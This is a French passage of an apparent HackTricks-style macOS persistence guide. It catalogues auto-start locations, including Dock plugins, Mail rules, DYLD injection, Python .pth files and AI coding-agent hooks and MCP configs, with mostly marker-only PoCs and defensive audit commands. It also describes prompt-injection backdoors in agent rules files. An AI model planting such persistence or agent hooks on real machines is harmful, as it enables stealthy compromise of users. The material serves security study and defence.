Writeup : [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais l'application ciblée doit être installée et lancée/utilisée par la victime
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

Un **script interprété qu'une application ou un outil installé exécute réellement** et que l'acteur peut modifier. Vérifiez les permissions du fichier et le chemin d'appel ; la simple présence d'un fichier `.sh` ou `.py` ne suffit pas. Le [guide de signature de code](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) d'Apple indique que les bundles d'applications signés scellent leurs ressources, y compris les scripts. Modifier un script inclus dans le bundle rompt ce sceau et peut être détecté ou bloqué lors de la validation du bundle. Un script externe, tel que le lanceur de Homebrew, présente un comportement différent en matière de signature et de confiance. Les exemples historiques du writeup incluent :

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – un script utilisé par d'anciennes versions de Sublime Text ; la présence du fichier et son utilisation au démarrage doivent être vérifiées pour la version installée. Il était absent du Mac de test.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) ou **`/usr/local/bin/brew`** (Intel) – un lanceur Bash exécuté lorsque le chemin `brew` correspondant est appelé, s'il est installé et accessible en écriture par l'acteur. Sur le Mac de test, `/opt/homebrew/bin/brew` était un script Bash accessible en écriture ; il s'agit d'une observation locale, et non d'une règle générale concernant les permissions de Homebrew.
- **`idlemain.py` d'IDLE**, dans un bundle d'app Python – son écriture peut nécessiter des permissions d'administrateur, mais il s'exécute avec l'identité de l'utilisateur d'IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – un script shell historique exécuté en tant que root lorsque la tâche launchd correspondante `org.wireshark.ChmodBPF` est installée. Le script et la tâche étaient absents du Mac de test.

#### Description et exploitation

Certains outils et certaines applications exécutent des scripts interprétés au moment de l'exécution. Un script accessible en écriture peut exécuter des commandes ajoutées lors du prochain lancement de son appelant spécifique, à condition que la validation de signature, la quarantaine et les autres vérifications le permettent. La recherche originale a montré plusieurs installations en 2019 ; vérifiez à nouveau leurs chemins et leurs déclencheurs sur la version ciblée.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Ce test de copie a produit `marker fired: True` sur macOS 26.5.2 ; le lanceur d’origine n’a pas été touché. Cela prouve que le point d’insertion s’exécute dans la copie, et non qu’un bundle d’app signé modifié ou une véritable installation Homebrew réussirait toutes les vérifications au lancement.

### Plugins de tuile du Dock

Writeup : [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Nécessite qu’une app déclarant le plug-in soit détectée/enregistrée et traitée par le Dock
  - Le plugin est chargé dans un helper **signé par Apple** qui n’a pas d’entitlement app-sandbox et pour lequel la validation des bibliothèques est **désactivée**. Ce helper n’apparaissait pas dans l’interface Background Task Management dans la recherche citée ; sa visibilité sur une version cible doit être vérifiée.
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, référencé avec la clé **`NSDockTilePlugIn`** dans le `Info.plist` de l’app ; le `Info.plist` du plugin définit **`NSPrincipalClass`**.

#### Description et exploitation

Lorsqu’une app déclare `NSDockTilePlugIn`, le Dock peut charger le bundle référencé dans le helper XPC **`com.apple.dock.external.extra`** (`...extra.arm64` sur Apple Silicon) à l’ouverture de session ou lorsque sa tuile est ajoutée ; l’app elle-même n’a pas besoin de se lancer. Cela nécessite que l’app soit détectée/enregistrée et acceptée par macOS. Le helper est **signé par Apple**, ne possède pas l’entitlement `com.apple.security.app-sandbox` et possède `com.apple.security.cs.disable-library-validation`. La méthode **`setDockTile:`** de la classe principale est invoquée au chargement ; elle peut alors s’abonner aux notifications distribuées (par exemple `com.apple.screenIsLocked`) pour recevoir des événements ultérieurs.<sup>[[38]](#references)</sup>

Sur macOS 26.5.2, une inspection en lecture seule avec `codesign` a confirmé la signature Apple et les entitlements du helper, et plusieurs apps installées déclaraient `NSDockTilePlugIn`. Aucun nouveau plug-in n’a été installé ni chargé sur ce Mac ; l’exécution d’un bundle nouvellement écrit sur cette version reste donc non testée.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - L’extension de widget s’exécute dans **son propre processus**, et en ajouter une ne déclenche **pas** d’alerte Background Task Management
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)
  - Le plist de configuration se trouve dans un conteneur protégé par TCC ; le modifier depuis l’extérieur nécessite donc Full Disk Access ou un TCC bypass

#### Emplacement

- Bundle de l’extension de widget : **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widgets actifs/enregistrés : **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (clés `widgets.instances` et `widgets.widgets`)

#### Description et exploitation

Une extension WidgetKit intégrée à une app s’exécute dans **son propre processus**, géré par Notification Center. Enregistrer une instance dans `widgets.instances` (un blob `CHSWidget` encodé en base64 avec `NSKeyedArchiver` et contenant des données `INIntent`) puis redémarrer NotificationCenter fait charger le widget et exécuter son code `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Règles de Mail.app (Exécuter AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais Mail.app doit être configuré avec un compte et en cours d’exécution ; le déclencheur est un e-mail entrant
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)
  - Modifier les règles/scripts depuis l’extérieur de Mail peut nécessiter que Mail soit fermé et que l’Accès complet au disque soit activé sur les versions récentes de macOS

#### Emplacement

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (règles locales ; `V10` sur Sonoma/Sequoia, `V11`+ sur les versions plus récentes)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (règles synchronisées avec iCloud, prioritaires)
- Activation des règles : **`RulesActiveState.plist`** ; payload AppleScript : **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Description et exploitation

Une **règle** d’Apple Mail peut inclure une action *« Exécuter AppleScript »*. En ajoutant une règle qui correspond à une **ligne d’objet** spécialement conçue et exécute un script de l’attaquant, l’adversaire obtient une exécution de code **déclenchable à distance et furtive** dans le contexte de Mail, chaque fois que l’e-mail magique arrive — un vecteur qui échappe à de nombreux scanners de persistance, car aucun LaunchAgent/Login Item n’est créé.<sup>[[42]](#references)</sup> Configurer la règle pour qu’elle **supprime** également l’e-mail déclencheur dissimule les preuves. Les défenseurs peuvent le rechercher directement :<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profils de configuration (.mobileconfig)

Compte rendu : [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Utile pour contourner sandbox : [🔴](https://emojipedia.org/large-red-circle)
  - Les versions modernes de macOS exigent une **approbation manuelle de l’utilisateur** dans Réglages système → *Gestion des appareils* (l’installation silencieuse avec `profiles install` n’est plus possible en dehors de MDM)
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Les profils installés se trouvent dans **`/Library/Managed Preferences/`** et **`/var/db/ConfigurationProfiles/`** ; un profil est un plist XML contenant un tableau `PayloadContent`.

#### Description et exploitation

Un `.mobileconfig` n’est pas un mécanisme d’exécution de code direct, mais il peut conserver des configurations telles qu’une **CA racine de confiance** (`com.apple.security.root`), un **proxy global ou PAC** (`com.apple.proxy.*`), des **préférences gérées** (`com.apple.ManagedClient.preferences`) ou des restrictions. Sur macOS 10.15 et versions ultérieures, la définition [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) d’Apple indique que si ce paramètre est défini sur `true` dans un profil **installé manuellement** sans payload de mot de passe de suppression, une **authentification administrateur** est requise pour le supprimer ; cela ne rend pas ce profil absolument impossible à supprimer. Les profils installés par MDM sont soumis à des règles distinctes de gestion et de suppression.<sup>[[44]](#references)</sup>

> [!WARNING]
> Un profil de configuration simple ne possède **aucun type de payload permettant de déposer un `LaunchDaemon`/`LaunchAgent` arbitraire**. Installer un daemon de cette manière nécessite une **inscription MDM complète** ainsi qu’un agent/script de gestion — ne considérez pas `.mobileconfig` comme un mécanisme de distribution launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistance via DYLD_INSERT_LIBRARIES

- Utile pour contourner le sandbox : [🔴](https://emojipedia.org/large-red-circle)
  - dyld **supprime** `DYLD_*` pour les binaires SIP/de plateforme, les apps avec hardened runtime et les cibles setuid ; l’injection ne fonctionne donc que dans les processus non protégés et ne contourne **pas** SIP/le hardened runtime
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Forme fiable : le dictionnaire **`EnvironmentVariables`** dans un plist malveillant de `LaunchAgent`/`LaunchDaemon` (exécuté à la connexion/au démarrage)
- Obsolètes/historiques (à titre informatif uniquement) : **`~/.MacOSX/environment.plist`** (supprimé dans la version 10.8) et **`/etc/launchd.conf`** (supprimé dans la version 10.10)

#### Description et exploitation

Si un attaquant parvient à intégrer `DYLD_INSERT_LIBRARIES` dans l’environnement d’un processus victime, dyld charge la dylib de l’attaquant (son constructeur s’exécute) dans ce processus. La variante persistante intègre la variable dans un LaunchAgent afin que chaque lancement de la tâche réinjecte la dylib. Notez que `launchctl setenv DYLD_*` est filtré dans les versions modernes de macOS ; intégrez-la donc plutôt dans le plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Pour connaître tous les mécanismes d’injection/détournement de dylib, voir :

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI d’agents de codage IA (hooks, serveurs MCP, fichiers de règles)

Analyses : [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [porte dérobée dans un fichier de règles (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Nécessite que le développeur utilise l’agent concerné. Les commandes de démarrage s’exécutent avec les privilèges de cet utilisateur lorsque l’agent accepte sa configuration ; la confiance accordée à l’espace de travail et l’approbation MCP varient selon le produit et le mode de session.
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle) (s’exécute en tant qu’utilisateur ; hérite des droits déjà accordés au terminal/agent)

#### Emplacement

Les fichiers de configuration explicites des hooks et de MCP peuvent entraîner l’exécution de **commandes shell ou de processus enfants lorsque le développeur utilise l’outil** — soit à partir d’un fichier global par utilisateur (persistance), soit à partir d’un fichier inclus dans un dépôt (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` et les règles de l’éditeur sont des **instructions destinées à un agent**, et leur lecture ne garantit pas l’exécution de commandes shell ; leur effet dépend du comportement de l’agent et des autorisations de ses outils. Vérifiez les règles actuelles de confiance et d’approbation propres à chaque produit.

- **Claude Code**
  - `~/.claude/settings.json`, le fichier de projet `.claude/settings.json`, `.claude/settings.local.json` et le fichier **`/Library/Application Support/ClaudeCode/managed-settings.json`**, accessible uniquement au compte root (les réglages MDM/gérés **ne peuvent pas être remplacés** par l’utilisateur → persistance forte)
  - Objet `hooks` — événements `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — chacun exécute une `command` shell
  - `statusLine.command` — commande shell exécutée pour afficher la ligne d’état (à chaque session)
  - Serveurs MCP dans `~/.claude.json` / `.mcp.json` du projet — `command`+`args` lancés comme processus enfants
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instructions pouvant tenter une prompt injection, selon le comportement de l’agent et les autorisations de ses outils
- **OpenAI Codex CLI** : `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` lancés comme processus enfants) ; instructions de projet `AGENTS.md`
- **Gemini CLI** : `~/.gemini/settings.json` (`hooks`, serveurs MCP) ; `GEMINI.md`
- **Cursor** : `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … exécutent des commandes) ; `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json` ; GitHub Copilot `.github/copilot-instructions.md`

#### Description et exploitation

Si un acteur peut modifier les paramètres globaux de l’utilisateur, ses commandes hook ou MCP peuvent s’exécuter lors de sessions ultérieures sous ce compte. Une configuration contrôlée par un dépôt est un cas distinct : la [documentation actuelle de sécurité de Claude Code](https://code.claude.com/docs/en/security) décrit une boîte de dialogue interactive de confiance pour l’espace de travail et une demande d’approbation distincte pour les serveurs `.mcp.json` du projet. [Sa matrice d’autorisations](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) indique que les hooks peuvent s’exécuter après qu’un dossier parent a été déclaré fiable, et que les sessions `claude -p`/SDK n’affichent pas la demande interactive de confiance ; dans ces modes non interactifs, les serveurs MCP du projet se connectent sans demande d’approbation. Le contournement des hooks de projet avant l’établissement de la confiance, signalé sous CVE-2025-59536, a été [corrigé en 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) ; ne le considérez pas comme un comportement par défaut actuel. Les vecteurs de diffusion peuvent inclure un dépôt compromis ou un installateur malveillant. L’injection de prompt dans un fichier de règles est moins déterministe qu’un hook explicite et dépend toujours des approbations d’outils.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Exemple de paramètres globaux utilisateur de Claude Code ; pour les tests, utilisez uniquement un compte jetable :

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Exemple de configuration MCP Codex globale pour l’utilisateur :

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Exemple de configuration d’un hook Cursor ; vérifiez le schéma de la version installée avant de l’utiliser :

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Extensions de navigateur (Chromium : Chrome / Brave / Edge)

Writeup : [Extensions externes de Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Abus d’ExtensionInstallForcelist sur macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Nécessite un navigateur compatible et une extension installée et activée. Sur macOS, les extensions externes nécessitent la confirmation de l’utilisateur ; le force-install géré nécessite une stratégie d’entreprise applicable.
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Il s’agit d’un mécanisme distinct des **hôtes de native messaging** (voir la section *Hôtes de native messaging de Chrome* ci-dessus). Ici, la persistance est assurée par **l’extension installée automatiquement** elle-même.

#### Emplacement

- **Fichier JSON External Extensions** (détecté au démarrage du navigateur, puis soumis à une demande d’activation sur macOS) :
  - Chrome : `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (par utilisateur) ou `/Library/Application Support/Google/Chrome/External Extensions/` (tous les utilisateurs)
  - Brave : `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge : `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Installation forcée par stratégie d’entreprise** via des préférences gérées / un profil de configuration :
  - clé `ExtensionInstallForcelist` de `com.google.Chrome` (`com.brave.Browser` pour Brave, `com.microsoft.Edge` pour Edge), lue depuis `/Library/Managed Preferences/` ou un fichier `.mobileconfig` installé

#### Description et exploitation

Il s’agit de deux méthodes d’installation différentes. La [documentation de Chrome sur l’installation externe](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) indique que les utilisateurs Windows et macOS doivent **confirmer et activer** une extension proposée par un fichier *External Extensions* ; celle-ci ne s’exécute pas simplement parce que ce fichier JSON a été écrit. Pour une installation destinée à tous les utilisateurs sur macOS, Chrome exige également que le fichier d’extension externe soit protégé contre toute modification par un utilisateur non privilégié. Une stratégie gérée `ExtensionInstallForcelist` ou `ExtensionSettings` peut installer et épingler une extension sans intervention de l’utilisateur ; le [guide de stratégie Mac de Google](https://support.google.com/chrome/a/answer/7517624) décrit la configuration gérée et précise que l’utilisateur ne peut pas supprimer les extensions installées de force. Il s’agit d’une méthode de déploiement par stratégie, et non d’un raccourci `defaults write` par utilisateur.<sup>[[49]](#references)</sup>

> [!WARNING]
> Sur macOS, un manifeste JSON *External Extensions* doit pointer vers une URL de mise à jour du **Chrome Web Store**, et non vers un fichier CRX local. Le déploiement par stratégie gérée a ses propres prérequis d’entreprise et peut autoriser une URL de mise à jour autohébergée gérée. Pour charger une extension locale non empaquetée dans un profil de test, l’option `--load-extension=/path` du mode développeur de Chrome est un mécanisme distinct ; elle ne rend pas un fichier JSON External Extensions auto-exécutable. Ne considérez pas une écriture dans `Secure Preferences` comme équivalente à l’une ou l’autre des méthodes d’enregistrement documentées.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Démarrez Chrome dans ce compte jetable et observez l’invite d’activation ; le comportement propre à l’extension constitue le PoC d’exécution une fois que l’utilisateur l’accepte. Après le test, supprimez le manifeste et désactivez/désinstallez l’extension dans ce profil. Cette méthode n’a pas été testée dans le profil Chrome actif du Mac de recherche. La méthode via une stratégie gérée n’y a pas non plus été déployée.

L’installation forcée et les extensions externes font référence aux ID des extensions du **Chrome Web Store** ; pour l’astuce de niveau inférieur permettant d’injecter silencieusement une extension locale en modifiant les `Secure Preferences` du profil, signées par HMAC, ainsi que pour d’autres abus des processus Chromium, voir :

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Schémas d’URL et gestionnaires de types de fichier (LaunchServices)

Compte rendu : [Exploitation à distance d’un Mac via des schémas d’URL personnalisés (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Le déclencheur est le clic de la victime sur un lien (par ex. dans Chrome/Brave/Safari) ou l’ouverture d’un fichier du type enregistré
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Le `Info.plist` d’un bundle d’app déclarant **`CFBundleURLTypes`/`CFBundleURLSchemes`** (schéma d’URL personnalisé) ou **`CFBundleDocumentTypes`** (extension de fichier/UTI)
- Les réglages par défaut effectifs pour chaque utilisateur peuvent figurer dans **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (tableau `LSHandlers`). L’API prise en charge par Apple pour choisir le gestionnaire par défaut d’un schéma d’URL est `LSSetDefaultHandlerForURLScheme` ; la modification directe de ce plist n’est pas une méthode documentée d’enregistrement ou de mise à jour du cache.

#### Description et exploitation

Launch Services récupère les déclarations de schémas d’URL et de documents depuis le `Info.plist` d’une app enregistrée. Le [guide d’enregistrement d’Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) indique que l’enregistrement peut avoir lieu lorsque Finder découvre l’app, au démarrage ou à la connexion, ou via une API d’enregistrement explicite ; le simple fait d’écrire une app quelque part ne déclenche pas nécessairement son enregistrement immédiatement. Une fois l’app enregistrée, l’ouverture d’une URL ou d’un document correspondant peut lancer l’app gestionnaire sélectionnée, sous réserve du choix de gestionnaire par défaut de l’utilisateur et des vérifications normales de lancement de macOS. L’API prise en charge `LSSetDefaultHandlerForURLScheme` modifie le gestionnaire d’URL préféré par l’utilisateur ; elle ne déclenche pas automatiquement l’exécution d’une app qui vient d’être déposée.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Aucune app n’a été enregistrée et aucune préférence de gestionnaire n’a été modifiée sur le Mac de recherche sous macOS 26.5.2. Pour tester un gestionnaire réel, utilisez un compte utilisateur jetable, enregistrez une app qui ne fait que créer un marqueur avec un schéma unique, appelez son URL, puis supprimez l’app et son enregistrement.

Pour approfondir l’énumération et l’abus des gestionnaires d’extensions de fichiers et de schémas URL, consultez :

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Fichiers de démarrage Python (`.pth` / `usercustomize` / `sitecustomize`)

Documentation : [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - S’exécute au démarrage de l’interpréteur Python concerné lorsque ce répertoire `site` est activé ; le déclenchement n’est pas universel d’un environnement virtuel, d’une build Python ou d’une option de démarrage à l’autre
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)
  - S’exécute avec les privilèges et le TCC du processus qui a lancé l’interpréteur

#### Emplacement

- **`$(python3 -m site --user-site)/*.pth`** (builds macOS framework : `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Aucun accès root requis (inscriptible par l’utilisateur)
  - **Déclenchement** : démarrage de cette build Python avec son site utilisateur activé ; le module `site` traite les fichiers `.pth` des répertoires `site` actifs
- **`<user-site>/usercustomize.py`**
  - Aucun accès root requis
  - **Déclenchement** : démarrage avec le site utilisateur activé (importé automatiquement par `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (par exemple, `/opt/homebrew/lib/python3.13/site-packages/` ou des chemins système)
  - Un accès root/admin peut être nécessaire selon l’emplacement de l’interpréteur
  - **Déclenchement** : démarrage d’un interpréteur qui inclut ce répertoire `site`

#### Description & Exploitation

Au démarrage, Python importe normalement `site` et parcourt ses répertoires `site-packages` actifs à la recherche de fichiers `.pth`. En plus d’ajouter des chemins, une ligne `.pth` commençant par `import ` exécute du code Python, même si le module indiqué n’est jamais utilisé par ailleurs. Python tente également d’importer `sitecustomize` et, **lorsque le site utilisateur est activé**, `usercustomize`.<sup>[[56]](#references)</sup> Le déclenchement a lieu au démarrage ultérieur d’un interpréteur qui détecte le répertoire modifié. `-S` désactive le traitement de `site` ; `-s`, `-I` ou `PYTHONNOUSERSITE` désactivent les variantes du **site utilisateur**. `-I` ne désactive généralement pas un `sitecustomize` global. Les environnements virtuels peuvent également exclure le site utilisateur. Vérifiez `python3 -m site` pour l’interpréteur concerné.

La PoC suivante a été exécutée sous macOS 26.5.2. `PYTHONUSERBASE` déplace le site utilisateur dans un répertoire temporaire pour ce test ; aucun site utilisateur réel n’est modifié :

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Les deux marqueurs sont apparus. Répéter le test avec `-s`, `-I` ou `-S` a empêché l’apparition des deux marqueurs **user-site** dans ce test. `sitecustomize` dans un répertoire global de site n’a pas été testé.

## Root Sandbox Bypass

> [!TIP]
> Vous trouverez ici des emplacements de démarrage utiles pour le **sandbox bypass**, qui permet d’exécuter simplement quelque chose en **l’écrivant dans un fichier** en étant **root** et/ou en exigeant d’autres **conditions inhabituelles**.

### Periodic

> [!CAUTION]
> **Mécanisme historique :** Sur la machine de test macOS 26.5.2, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` et les launch daemons `com.apple.periodic-*` sont absents. Ne partez pas du principe que la création de `/etc/periodic` sur un système actuel programmera l’exécution de son contenu. Avant d’utiliser l’exemple ci-dessous, vérifiez que la commande existe et qu’un ordonnanceur est activé sur la version cible.

Writeup : [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Utile pour le sandbox bypass : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais il faut être root
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root requis
  - **Déclenchement** : À l’heure prévue
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
  - Root requis
  - **Déclenchement** : À l’heure prévue

#### Description et exploitation

Sur les anciennes versions, les scripts periodic (**`/etc/periodic`**) étaient programmés par des **launch daemons** dans `/System/Library/LaunchDaemons/com.apple.periodic*`. À partir de macOS Big Sur 11.5, le lanceur periodic exécutait les scripts des répertoires periodic en tant que **propriétaire de chaque fichier**, fermant ainsi une ancienne voie d’élévation de privilèges.<sup>[[27]](#references)</sup> Les commandes et listes de répertoires ci-dessous sont des résultats historiques, et non des résultats de test sur macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
